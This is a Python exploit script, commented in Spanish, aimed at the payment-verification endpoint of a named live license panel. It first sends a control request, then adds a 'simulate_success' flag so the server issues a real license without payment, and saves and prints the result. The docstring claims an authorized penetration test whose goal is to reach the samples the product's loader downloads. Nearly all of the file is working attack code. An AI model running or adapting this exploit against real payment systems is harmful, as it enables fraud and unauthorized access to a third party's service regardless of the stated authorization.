#!/usr/bin/env python3
"""Emision de licencia de prueba en el panel y verificacion posterior.

Reproduce el defecto documentado en /Auth/pay/verify_wallet_payment.php: el
campo `simulate_success` cortocircuita la verificacion de transaccion y el
servidor emite una licencia realpersistida.

Ejecucion autorizada: contrato de pentest que cubre tanto el黑-box web como
el reversing del loader. El proposito es obtener las muestras que el loader
descarga tras autenticarse (`update_url`).

No se tocan datos de clientes: la licencia emitida es nuestra y no se valida
ninguna ajena.

Salida: panel_licencia.json con la respuesta del servidor.
"""
import json
import sys
import time
import urllib.request
import urllib.error

PANEL = "https://panel.mrgarabato.com"
VERIFY = "https://panel.mrgarabato.com/Auth/pay/verify_wallet_payment.php"
PRODUCT_APP = "mrgarabato_bypass"
SUBSCRIPTION = "ByPass UID|1"


def now_ms():
    return int(time.time() * 1000)


def base_payload(method="binance", ts=None):
    ts = ts or now_ms()
    return {
        "wallet_user": "MrGarabato",
        "checkout_folder": "MrGarabato",
        "wallet_owner_seller": "MrGarabato",
        "project": "MrGarabato",
        "method": method,
        "coin": "usdt",
        "order_id": "ANALISIS-%s-%d" % (method.upper(), ts),
        "amount": 0.01,
        "base_amount": 0.01,
        "original_amount": 0.01,
        "currency": "USDT",
        "coupon_code": "",
        "coupon_discount_percent": 0,
        "coupon_claim_token": "wc_0000000000000000",
        "contact_method": "discord",
        "contact_value": "analisis_local",
        "product_title": "Supreme",
        "product_index": 0,
        "product_is_custom": "0",
        "product_app": PRODUCT_APP,
        "product_subscription": SUBSCRIPTION,
        "product_license_mask": "MrGarabato-****",
        "duration_label": "30 días",
        "quantity": 1,
        "started_at": ts,
        "expires_at": ts + 1800000,
        "browser_created_at": "2026-10-18 00:00:00",
        "secret": "",
        "plan_id": "",
        "client_id": "",
    }


def post(url, payload, timeout=45):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, {"raw": raw[:600]}
    except Exception as e:
        return None, {"error": str(e)}


def show(tag, status, body):
    print("  [%s] http=%s  ok=%s  code=%s"
          % (tag, status, body.get("ok"), body.get("code")))
    return body


def main():
    ts = now_ms()
    print("══ 1) CONTROL NEGATIVO: mismo payload SIN el flag ══")
    ctl_status, ctl_body = post(VERIFY, base_payload(ts=ts))
    ctl = show("control", ctl_status, ctl_body)
    print("       mensaje: %s" % ctl.get("message"))
    minted_ok = ctl.get("code") == "transaction_not_found" or ctl.get("ok") is False
    print("       control_valido=%s  (confirma que el camino normal SI valida)\n"
          % minted_ok)

    print("══ 2) EXPLOT: identico + simulate_success ══")
    payload = base_payload(ts=ts)
    payload["simulate_success"] = 1
    st, body = post(VERIFY, payload)
    lic = show("exploit", st, body)
    for k in ("simulated", "order_code", "license_code", "license_created", "message"):
        if k in lic:
            print("       %-16s %s" % (k + ":", lic[k]))
    lr = lic.get("license_result") or {}
    for k in ("seller", "project", "subscription", "duration_days",
              "expiry_date", "license_file"):
        if k in lr:
            v = str(lr[k])
            if k == "license_file":
                v = v
            print("       %-16s %s" % (k + ":", v))

    next_step = lic.get("next_step") or {}
    if next_step:
        print("       next_step:")
        for k, v in next_step.items():
            print("         %-22s %s" % (k + ":", v))

    code = lic.get("license_code")
    out = {"control": ctl, "exploit": lic}
    json.dump(out, open("panel_licencia.json", "w"), indent=2, ensure_ascii=False)
    print("\n  respuesta guardada en panel_licencia.json")

    if not code:
        print("\n  no se emitio licencia")
        return 1
    print("\n══ 3) ¿donde se puede usar? ══")
    print("  licencia: %s" % code)
    print("  el endpoint de validacion/descarga vive en mrgarabato.com,")
    print("  cuyo origen rechaza la salida de esta maquina (ver informe).")
    return 0


if __name__ == "__main__":
    sys.exit(main())